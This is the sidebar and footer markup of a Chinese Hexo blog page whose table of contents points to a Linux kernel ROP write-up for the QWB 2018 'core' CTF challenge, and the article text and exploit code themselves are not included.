class="nav-item nav-level-2"><a class="nav-link" href="#从kernel态返回用户态进行的操作"><span class="nav-number">2.2.</span> <span class="nav-text">从kernel态返回用户态进行的操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一般的攻击思路"><span class="nav-number">2.3.</span> <span class="nav-text">一般的攻击思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实操linux-kernel-ROP"><span class="nav-number">3.</span> <span class="nav-text">实操linux kernel ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯2018-core"><span class="nav-number">3.1.</span> <span class="nav-text">强网杯2018-core</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动踩坑"><span class="nav-number">3.1.1.</span> <span class="nav-text">启动踩坑</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">3.2.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步"><span class="nav-number">3.2.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ioctl"><span class="nav-number">3.2.2.</span> <span class="nav-text">ioctl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#core-read"><span class="nav-number">3.2.3.</span> <span class="nav-text">core_read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#core-copy-func"><span class="nav-number">3.2.4.</span> <span class="nav-text">core_copy_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#core-write"><span class="nav-number">3.2.5.</span> <span class="nav-text">core_write</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2user-amp-exp"><span class="nav-number">3.2.6.</span> <span class="nav-text">ret2user&amp;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试过程"><span class="nav-number">3.3.</span> <span class="nav-text">调试过程</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Coldshield"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Coldshield</p>
  <div class="site-description" itemprop="description">分享一些bin学习日常</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Coldshield</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'APq34QYuAOTUtOPWMtySvyvt-gzGzoHsz',
      appKey     : 'xRjoMerK1OFN4Lad4pyXT0Bs',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
